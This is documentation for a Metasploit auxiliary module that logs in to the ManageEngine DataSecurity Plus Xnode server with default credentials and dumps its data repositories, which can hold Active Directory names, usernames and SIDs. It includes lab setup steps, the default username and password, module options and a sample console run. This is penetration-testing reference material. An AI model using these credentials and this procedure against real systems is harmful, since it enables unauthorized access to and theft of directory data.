## Vulnerable Application
The module exploits default admin credentials for the DataEngine Xnode server in DataSecurity Plus versions prior to 6.0.1 (6011)
in order to dump the contents of Xnode data repositories (tables), which may contain (a limited amount of) Active Directory information
including domain names, host names, usernames and SIDs.
The module can also be used against patched DataSecurity Plus versions if the correct credentials are provided.

The module's `check` method attempts to authenticate to the remote Xnode server. The default credentials are `atom`:`chegan`.
If the credentials are valid, the module will perform a few requests to the Xnode server to obtain information like the Xnode version.
This is mostly done as a sanity check to ensure the Xnode server is working as expected.

Next, the module will iterate over a list of known Xnode data repositories and perform several requests for each in order to:
- Check if the data repository is configured on the target
- Obtain the total number of records in the data repository
- Obtain both the lowest and the highest value for the ID field (column)

If a given data repository exists, the module uses the above information to dump the data repository contents.
The maximum number of records returned for a search query is 10. To overcome this, the module performs series of requests
using the `dr:/dr_search` action,while specifying the ID values for each record.
For example, if the lowest observed ID value is 15 and the highest is 41, the module will perform three requests:
1. A request for the records with ID values 15 to 24
2. A request for the records with ID values 25 to 34
3. A request for the records with ID values 35 to 41
Empty records are ignored.

To view the raw Xnode requests and responses, enter `set VERBOSE true` before running the module.

By default, the module dumps only the data repositories (tables) and fields (columns) specified in the configuration file.
The configuration file can be set via the CONFIG_FILE option, but this is not required because a default config file exists.
The configuration file is then also used to add labels to the values sent by Xnode in response to a query.
This means that for every value in the Xnode response, the module will add the corresponding field name to the results
before writing those to a JSON file.

It is also possible to use the DUMP_ALL option to obtain all data in all known data repositories without specifying data field names.
However, in the latter case the data won't be labeled.

This module has been successfully tested against DataSecurity Plus 6.0.1 (6010) running on Windows Server 2012 R2
and DataSecurity Plus 6.0.5 (6052) running on Windows Server 2019.

## Installation Information
A free 30-day trial of DataSecurity Plus can be downloaded [here](https://www.manageengine.com/data-security/download.html).
To install, just run the .exe and follow the instructions.
In order to configure the ManageEngine DataSecurity Plus instance for testing, follow these steps:
- Open the Xnode config file at `<install_dir>\apps\dataengine-xnode\conf\dataengine-xnode.conf`
- Note down the username and password
- Insert the following line:
```
xnode.connector.accept_remote_request = true
```
To launch DataSecurity Plus, run Command Prompt as administrator and run: `<install_dir>\bin\run.bat`

## Verification Steps
1. Start msfconsole
2. Do: `use auxiliary/gather/manageengine_datasecurity_plus_xnode_enum`
3. Do: `set RHOSTS [IP]`
4. Do: `run`

## Options
### CONFIG_FILE
YAML File specifying the data repositories (tables) and fields (columns) to dump.
### DUMP_ALL
Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.

## Scenarios
### DataSecurity Plus 6.0.5 (6052) running on Windows Server 2019 (custom password)
```
msf6 > use auxiliary/gather/manageengine_datasecurity_plus_xnode_enum
msf6 auxiliary(gather/manageengine_datasecurity_plus_xnode_enum) > set rhosts 192.168.1.25
rhosts => 192.168.1.25
msf6 auxiliary(gather/manageengine_datasecurity_plus_xnode_enum) > set password custom_password
password => custom_password
msf6 auxiliary(gather/manageengine_datasecurity_plus_xnode_enum) > options 

Module options (auxiliary/gather/manageengine_datasecurity_plus_xnode_enum):

   Name         Current Setting                                                                                                 Required  Description
   ----         ---------------                                                                                                 --------  -----------
   CONFIG_FILE  /root/github/manageengine/metasploit-framework/data/exploits/manageengine_xnode/CVE-2020-11532/datasecurity_pl  no        File specifying the data repositories (tables) and fields (columns) to dump
                us_xnode_conf.yaml
   DUMP_ALL     false                                                                                                           no        Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.
   PASSWORD     custom_password                                                                                                 yes       Password used to authenticate to the Xnode server
   RHOSTS       192.168.1.25                                                                                                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        29119                                                                                                           yes       The target port (TCP)
   USERNAME     atom

msf6 auxiliary(gather/manageengine_datasecurity_plus_xnode_enum) > run
[*] Running module against 192.168.1.25

[*] 192.168.1.25:29119 - Running automatic check ("set AutoCheck false" to disable)
[+] 192.168.1.25:29119 - The target appears to be vulnerable. Successfully authenticated to the Xnode server.
[*] 192.168.1.25:29119 - Obtained expected Xnode "de_healh" status: "GREEN".
[*] 192.168.1.25:29119 - Target is running Xnode version: "DataEngine-XNode 1.0.1 (1016)".
[*] 192.168.1.25:29119 - Obtained Xnode installation path: "C:\Program Files (x86)\ManageEngine\DataSecurity Plus\apps\dataengine-xnode".
[*] 192.168.1.25:29119 - Data repository DSPEmailAuditAttachments is empty.
[*] 192.168.1.25:29119 - Data repository DSPEmailAuditReport is empty.
[*] 192.168.1.25:29119 - Data repository DSPEndpointAuditReport is empty.
[*] 192.168.1.25:29119 - Data repository DSPEndpointClassificationReport is empty.
[*] 192.168.1.25:29119 - Data repository DSPEndpointIncidentReport is empty.
[*] 192.168.1.25:29119 - Data repository DspEndpointPrinterAuditReport is empty.
[*] 192.168.1.25:29119 - Data repository DspEndpointWebAuditReport is empty.
[*] 192.168.1.25:29119 - Data repository DSPFileAnalysisAlerts is empty.
[*] 192.168.1.25:29119 - Data repository RAAlertHistory is empty.
[*] 192.168.1.25:29119 - Data repository RAIncidents is empty.
[*] 192.168.1.25:29119 - Data repository RAViolationRecords is empty.
[*] Auxiliary module execution completed
msf6 auxiliary(gather/manageengine_datasecurity_plus_xnode_enum) 
```
